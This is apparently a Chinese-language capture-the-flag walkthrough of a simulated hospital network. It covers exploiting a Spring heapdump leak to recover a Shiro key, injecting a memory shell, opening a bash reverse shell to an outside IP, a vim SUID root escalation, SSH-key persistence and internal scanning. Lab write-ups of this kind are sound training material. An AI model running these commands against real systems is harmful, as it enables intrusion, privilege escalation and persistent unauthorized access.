---
tags: [Shiro, Heapdump泄露, 反序列化]
---

# 春秋云境hospital

先用fscan扫一下，知道了医院管理后台和一个heapdump信息泄露

```
D:\fscan>fscan -h 39.99.236.70
   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
39.99.236.70:8080 open
39.99.236.70:22 open
[*] alive ports len is: 2
start vulscan
[*] WebTitle http://39.99.236.70:8080  code:302 len:0      title:None 跳转url: http://39.99.236.70:8080/login;jsessionid=26E5B7C9E07448E57A648A99B637A93A
[*] WebTitle http://39.99.236.70:8080/login;jsessionid=26E5B7C9E07448E57A648A99B637A93A code:200 len:2005   title:医疗管理后台
[+] PocScan http://39.99.236.70:8080 poc-yaml-spring-actuator-heapdump-file
已完成 1/2 [-] ssh 39.99.236.70:22 root root111 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
已完成 1/2 [-] ssh 39.99.236.70:22 root 123456789 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
```

这里访问http://39.99.236.70:8080/actuator/heapdump可以下载

然后用JDumpSpider进行信息获取，或者也可以手工在MAP中进行查询，成功获取到了密钥

```
CookieRememberMeManager(ShiroKey)
-------------
algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES
```

然后就可以注入内存马，这里用冰蝎的内存马然后用冰蝎连接

![image-20251224141614793](C:\Users\87701\AppData\Roaming\Typora\typora-user-images\image-20251224141614793.png)

但是发现执行命令大部分没回显，冰蝎自带的反弹shell是没法进行交互式命令执行的，需要手工进行反弹shell

![image-20251224141551838](C:\Users\87701\AppData\Roaming\Typora\typora-user-images\image-20251224141551838.png)

这里可以先手工写一个反弹shell

bash -i >& /dev/tcp/47.109.157.54/1337 0>&1

然后放到[java.lang.Runtime.exec() Payload Workarounds - @Jackson_T](https://bewhale.github.io/tools/encode.html)加工一下就可以进行命令执行

![image-20251224143647047](C:\Users\87701\AppData\Roaming\Typora\typora-user-images\image-20251224143647047.png)

在vps上成功监听到，可以交互执行

![image-20251224143739515](C:\Users\87701\AppData\Roaming\Typora\typora-user-images\image-20251224143739515.png)

想要进入root目录但是权限不够

尝试suid提权

查找suid文件

![image-20251224143839694](C:\Users\87701\AppData\Roaming\Typora\typora-user-images\image-20251224143839694.png)

使用vim查看/root/flag/flag01.txt

![image-20251224144009657](C:\Users\87701\AppData\Roaming\Typora\typora-user-images\image-20251224144009657.png)

## flag02

```
/usr/bin/vim.basic  -c ':python3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

vim提权到root

生成一对ssh密钥，我这里在powershell里生成

```text
ssh-keygen -t rsa
```

可以不设置密码

得到一个公共密钥（id_rsa.pub）和一个私有密钥（id_rsa）

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8AsQxL7C8TJrTIIKF0VE+r/6yeNSGrkSJsrHF7Kw/UEQs0odLYaldzz0q14iRtb7MM5BLKsVpOdVgehw7rnEjoPMeyYR35Dvc28U23wZn+Zt5jzssT7LkNWCtxQqbHchYgS2Wr6leRwpisYlYfczNIcCvE+q/TjtKMS4sD9Hmg4rI4yk0NpC4SrY5TyjTPcv+kBcfEukYFZSTieyBaYusxBGPOkFf8n4Jzt3zTMW9ah57zo7PkPcq8Nb0PPWiJ7QCJnEhIL785e1kklmBylSqR+NhR8lsuTUwHsxWM+oYWCiU3L5UhXckbt0ovXy9ledjx6Czk4GAOO1gG67yRNSkgGCGn9gvgeo284a2iDF3NxT66DUEvJnK6pFI0Lx7YDF0EvSZ4NHQJP0oga/z214EFwin8S0IIyavT+lDv1Oesz+EfLnLcAabIorz/qdpXgeUOhYGuqqfiPTCf5jxKp0G9Ak3WmcYynPfvDUMYqm1+ojBOanXjL0hfpnbyPp4HJE= 87701@YHR_PC" > /root/.ssh/authorized_keys

# 设置正确权限
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
```

然后再finalshell里用私钥去连接，用户是root

上传fscan扫内网，搭建隧道

```
root@web01:~# ./fscan -h 172.30.12.0/24

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.30.12.5     is alive
(icmp) Target 172.30.12.6     is alive
(icmp) Target 172.30.12.236   is alive
[*] Icmp alive hosts len is: 3
172.30.12.236:22 open
172.30.12.5:22 open
172.30.12.6:445 open
172.30.12.6:139 open
172.30.12.6:135 open
172.30.12.236:8080 open
172.30.12.5:8080 open
172.30.12.236:8009 open
172.30.12.6:8848 open
[*] alive ports len is: 9
start vulscan
[*] NetInfo 
[*]172.30.12.6
   [->]Server02
   [->]172.30.12.6
[*] NetBios 172.30.12.6     WORKGROUP\SERVER02            
[*] WebTitle http://172.30.12.5:8080   code:302 len:0      title:None 跳转url: http://172.30.12.5:8080/login;jsessionid=D31FBF7E7BDCA23724E3C47FB3F0676A
[*] WebTitle http://172.30.12.5:8080/login;jsessionid=D31FBF7E7BDCA23724E3C47FB3F0676A code:200 len:2005   title:医疗管理后台
[*] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台
[*] WebTitle http://172.30.12.6:8848   code:404 len:431    title:HTTP Status 404 – Not Found
[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos 
[+] PocScan http://172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file 
[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass 
```

